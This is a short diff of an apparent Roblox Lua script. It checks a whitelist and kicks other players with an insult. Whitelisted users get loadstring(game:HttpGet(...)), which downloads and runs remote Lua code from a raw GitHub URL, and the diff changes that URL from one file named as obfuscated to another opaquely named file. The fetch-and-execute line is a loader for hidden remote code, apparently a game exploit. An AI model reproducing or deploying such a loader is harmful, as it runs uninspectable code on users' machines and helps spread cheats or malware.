@@ -41,7 +41,7 @@ end
 
 if isWhitelisted then
     sendLog("PASOK")
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/dezqpal/Primo/refs/heads/main/V2Obfuscated.lua "))() 
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/dezqpal/peyd/refs/heads/main/Prm.msltwo "))() 
 else
     sendLog("NAGTANGKA")
     player:Kick("STFU KIDO")
